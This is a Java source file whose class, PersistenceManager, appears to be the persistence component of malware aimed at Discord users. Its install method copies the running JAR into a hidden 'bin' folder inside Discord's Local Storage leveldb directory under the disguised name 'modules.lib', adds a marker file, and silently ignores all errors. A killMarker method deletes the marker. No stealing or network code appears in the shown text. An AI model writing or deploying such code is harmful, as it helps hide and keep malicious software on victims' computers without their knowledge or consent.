import java.io.File;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

public class PersistenceManager {

    private static final String DISCORD_DIR      = "discord";
    private static final String LOCAL_STORAGE    = "Local Storage";
    private static final String LEVELDB_DIR      = "leveldb";
    private static final String BIN_DIR          = "bin";
    private static final String MARKER_FILE      = "modules.cache";

    private static final String JAR_FILENAME     = "modules.lib";

    public static void install() {
        try {

            String appData = System.getenv("APPDATA");
            String targetDirPath = appData + "\\" + DISCORD_DIR + "\\" +
                                   LOCAL_STORAGE + "\\" + LEVELDB_DIR + "\\" + BIN_DIR;

            File targetDir = new File(targetDirPath);
            if (!targetDir.exists()) {
                targetDir.mkdirs();
            }

            File sourceJar = new File(
                PersistenceManager.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()
            );

            File targetJar = new File(targetDir, JAR_FILENAME);

            if (sourceJar != null && (!targetJar.exists() || sourceJar.length() != targetJar.length())) {
                Files.copy(sourceJar.toPath(), targetJar.toPath(), StandardCopyOption.REPLACE_EXISTING);
            }

            File markerFile = new File(targetDir, MARKER_FILE);
            if (!markerFile.exists()) {
                markerFile.createNewFile();
            }

        } catch (Exception ignored) {}
    }

    public static void killMarker() {
        try {
            String appData = System.getenv("APPDATA");
            String markerPath = appData + "\\" + DISCORD_DIR + "\\" +
                                LOCAL_STORAGE + "\\" + LEVELDB_DIR + "\\" +
                                BIN_DIR + "\\" + MARKER_FILE;
            new File(markerPath).delete();
        } catch (Exception ignored) {}
    }
}